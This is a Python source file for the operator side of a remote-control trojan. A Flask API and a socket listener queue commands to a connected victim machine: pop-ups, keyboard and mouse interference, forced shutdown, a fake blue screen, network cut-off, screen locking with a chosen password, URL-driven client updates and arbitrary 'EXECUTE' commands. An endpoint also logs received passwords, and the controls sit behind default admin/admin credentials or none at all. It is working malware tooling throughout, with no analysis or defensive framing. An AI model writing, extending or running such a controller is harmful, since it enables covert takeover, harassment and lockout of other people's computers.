import os
import socket
import threading
import logging
from queue import Queue, Empty
from flask import Flask, render_template, request, jsonify

# 初始化 Flask 应用
app = Flask(__name__)

# 配置日志，将日志输出到文件或控制台
logging.basicConfig(filename='server.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# 初始化队列和同步事件
command_queue = Queue()
command_queue_lock = threading.Lock()
client_connected = threading.Event()  # 用于同步客户端连接状态

# 模拟的用户名和密码（实际应用中请使用更安全的存储方式）
USERNAME = os.getenv('APP_USERNAME', 'admin')
PASSWORD = os.getenv('APP_PASSWORD', 'admin')

def handle_client(client_socket):
    try:
        logging.info("客户端已连接")
        client_connected.set()  # 客户端连接成功
        client_socket.sendall("ACK".encode('utf-8'))

        while True:
            try:
                # 在这里你可以等待命令队列有新的命令
                command = command_queue.get(timeout=1)
                if command:
                    if command.startswith("UPDATE_URL:"):
                        url = command[len("UPDATE_URL:"):]
                        client_socket.sendall(f"UPDATE_URL:{url}".encode('utf-8'))
                    elif command.startswith("SEND_MESSAGE:"):
                        message = command[len("SEND_MESSAGE:"):]
                        client_socket.sendall(f"SEND_MESSAGE:{message}".encode('utf-8'))
                    elif command.startswith("LOCK_SCREEN:"):
                        password = command[len("LOCK_SCREEN:"):]
                        client_socket.sendall(f"LOCK_SCREEN:{password}".encode('utf-8'))
                    else:
                        client_socket.sendall(f"EXECUTE:{command}".encode('utf-8'))


                    response = client_socket.recv(1024)
                    if response.decode('utf-8') == "ACK":
                        logging.info("客户端已确认执行命令")
            except Empty:
                continue  # 如果队列为空，继续检查
            except Exception as e:
                logging.error(f"处理命令时出错: {e}")
                break
    except Exception as e:
        logging.error(f"处理客户端连接出错: {e}")
    finally:
        client_socket.close()
        logging.info("客户端已断开连接")
        client_connected.clear()  # 清除客户端连接状态



@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    try:
        data = request.get_json()
        username = data.get('username')
        password = data.get('password')

        if username == USERNAME and password == PASSWORD:
            logging.info(f"用户 {username} 登录成功")
            return jsonify({"status": "success", "message": "Login successful"}), 200
        else:
            logging.warning(f"用户 {username} 登录失败")
            return jsonify({"status": "error", "message": "Invalid username or password"}), 401
    except Exception as e:
        logging.error(f"处理登录请求时出错: {e}")
        return jsonify({"status": "error", "message": "Internal Server Error"}), 500

@app.route('/send_command', methods=['POST'])
def send_command():
    try:
        data = request.get_json()
        logging.info(f"接收到的数据: {data}")

        command = data.get('command')
        logging.info(f"接收到的命令: {command}")

        if command:
            with command_queue_lock:
                command_queue.put(command)
            logging.info(f"将命令放入队列: {command}")
            return jsonify({"status": "success", "command_received": command})
        else:
            logging.warning("没有提供命令")
            return jsonify({"status": "error", "message": "No command provided"}), 400
    except Exception as e:
        logging.error(f"处理请求时出错: {e}")
        return jsonify({"status": "error", "message": "Internal Server Error"}), 500

@app.route('/send_custom_message', methods=['POST'])
def send_custom_message():
    try:
        data = request.get_json()
        if data is None:
            return jsonify({"status": "error", "message": "无法解析请求体为 JSON"}), 400

        message = data.get('message')

        if message:
            logging.info(f"收到自定义消息: {message}")
            with command_queue_lock:
                command_queue.put(f"SEND_MESSAGE:{message}")
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "error", "message": "消息未提供"}), 400
    except Exception as e:
        logging.error(f"处理自定义消息时出错: {e}")
        return jsonify({"status": "error", "message": "内部服务器错误"}), 500


@app.route('/open_peppa_url', methods=['POST'])
def open_peppa_url():
    try:
        data = request.get_json()
        if data is None:
            return jsonify({"status": "error", "message": "无法解析请求体为 JSON"}), 400

        url = data.get('url')

        if url:
            logging.info(f"收到野猪佩奇的URL: {url}")
            with command_queue_lock:
                command_queue.put(f"OPEN_BROWSER:{url}")
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "error", "message": "URL未提供"}), 400
    except Exception as e:
        logging.error(f"处理野猪佩奇URL时出错: {e}")
        return jsonify({"status": "error", "message": "内部服务器错误"}), 500

@app.route('/update_url', methods=['POST'])
def update_url():
    try:
        data = request.get_json()
        if data is None:
            return jsonify({"status": "error", "message": "无法解析请求体为 JSON"}), 400

        url = data.get('url')

        if url:
            logging.info(f"收到更新的URL: {url}")
            with command_queue_lock:
                command_queue.put(f"UPDATE_URL:{url}")
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "error", "message": "URL未提供"}), 400
    except Exception as e:
        logging.error(f"处理更新URL时出错: {e}")
        return jsonify({"status": "error", "message": "内部服务器错误"}), 500

@app.route('/lock_screen', methods=['POST'])
def lock_screen():
    try:
        data = request.get_json()
        if data is None:
            return jsonify({"status": "error", "message": "无法解析请求体为 JSON"}), 400

        password = data.get('password')

        if password:
            logging.info(f"收到锁屏密码: {password}")
            with command_queue_lock:
                command_queue.put(f"LOCK_SCREEN:{password}")
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "error", "message": "密码未提供"}), 400
    except Exception as e:
        logging.error(f"处理锁屏请求时出错: {e}")
        return jsonify({"status": "error", "message": "内部服务器错误"}), 500


@app.route('/receive_password', methods=['POST'])
def receive_password():
    try:
        data = request.get_json()
        if data is None:
            return jsonify({"status": "error", "message": "无法解析请求体为 JSON"}), 400

        password = data.get('password')

        if password:
            logging.info(f"收到密码: {password}")
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "error", "message": "密码未提供"}), 400
    except Exception as e:
        logging.error(f"处理接收到的密码时出错: {e}")
        return jsonify({"status": "error", "message": "内部服务器错误"}), 500

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_menu():
    clear_screen()
    print("\n--- 菜单 ---")
    print("1. 随机弹窗")
    print("2. 键盘干扰")
    print("3. 鼠标干扰")
    print("4. 更改壁纸")
    print("5. 文字转化")
    print("6. 关闭程序")
    print("7. 发送消息")
    print("8. 屏幕闪烁")
    print("9. 程序干扰")
    print("10. 野猪佩奇")
    print("11. 幽灵输入")
    print("12. 关机")
    print("13. 打开程序")
    print("14. 更新指令")
    print("15. 更换图标")
    print("16. 锁屏")
    print("17. 弹出系统设置")
    print("18. 进程干扰")
    print("19. 模拟蓝屏")
    print("20. 鼠标点击延迟")
    print("21. 鼠标滚轮混乱")
    print("22. 断网")
    print("0. 重新显示菜单\n")


# 创建锁来控制命令执行的互斥
command_locks = {
    "鼠标点击延迟": threading.Lock(),
    "鼠标滚轮混乱": threading.Lock(),
    "断网": threading.Lock()
}

def input_thread():
    client_connected.wait()  # 等待客户端连接
    print_menu()  # 初次显示菜单

    while True:
        try:
            choice = input("请输入选项编号: ").strip()

            if choice == "0":
                clear_screen()
                print_menu()  # 清屏并重新显示菜单
                continue

            if choice == "1":
                command = "随机弹窗"
            elif choice == "2":
                command = "键盘干扰"
            elif choice == "3":
                command = "鼠标干扰"
            elif choice == "4":
                command = "更改壁纸"
            elif choice == "5":
                command = "文字转化"
            elif choice == "6":
                command = "关闭程序"
            elif choice == "7":
                message = input("请输入要发送的自定义消息: ").strip()
                command = f"SEND_MESSAGE:{message}"
            elif choice == "8":
                command = "屏幕闪烁"
            elif choice == "9":
                command = "程序干扰"
            elif choice == "10":
                url = input("请输入要发送的url: ").strip()
                command = f"OPEN_BROWSER:{url}"
            elif choice == "11":
                command = "幽灵输入"
            elif choice == "12":
                command = "关机"
            elif choice == "13":
                command = "打开程序"
            elif choice == "14":
                url = input("请输入更新的 URL: ").strip()
                command = f"UPDATE_URL:{url}"
            elif choice == "15":
                command = "更换图标"
            elif choice == "16":
                password = input("请输入锁屏密码: ").strip()
                command = f"LOCK_SCREEN:{password}"
            elif choice == "17":
                command = "弹出系统设置"
            elif choice == "18":
                command = "进程干扰"
            elif choice == "19":
                command = "模拟蓝屏"
            elif choice == "20":
                command = "鼠标点击延迟"
            elif choice == "21":
                command = "鼠标滚轮混乱"
            elif choice == "22":
                command = "断网"
            else:
                logging.warning("无效的选项，请重新选择。")
                continue  # 继续等待有效的输入

            with command_queue_lock:
                command_queue.put(command)
            logging.info(f"发送指令: {command}")

        except Exception as e:
            logging.error(f"处理输入时出错: {e}")


def start_server():
    server_ip = "0.0.0.0"
    server_port = 5002

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((server_ip, server_port))
        server_socket.listen(5)
        logging.info(f"服务器启动在 {server_ip}:{server_port}")

        # 启动输入线程
        threading.Thread(target=input_thread, daemon=True).start()

        while True:
            try:
                client_socket, addr = server_socket.accept()
                logging.info(f"接受到连接: {addr}")
                threading.Thread(target=handle_client, args=(client_socket,), daemon=True).start()
            except Exception as e:
                logging.error(f"接受连接出错: {e}")

if __name__ == "__main__":
    # 启动 Flask 服务器
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000), daemon=True).start()

    # 启动套接字服务器
    start_server()
